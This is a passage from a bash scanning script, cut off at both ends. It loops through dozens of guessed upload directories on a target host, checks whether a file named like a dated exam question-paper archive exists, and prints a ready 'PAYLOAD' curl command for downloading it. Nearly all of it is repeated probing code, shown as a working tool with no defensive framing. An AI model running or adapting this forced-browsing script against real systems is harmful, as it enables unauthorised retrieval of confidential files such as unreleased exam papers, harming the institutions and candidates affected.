${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_Ops/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_Ops/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperTransfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperTransfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
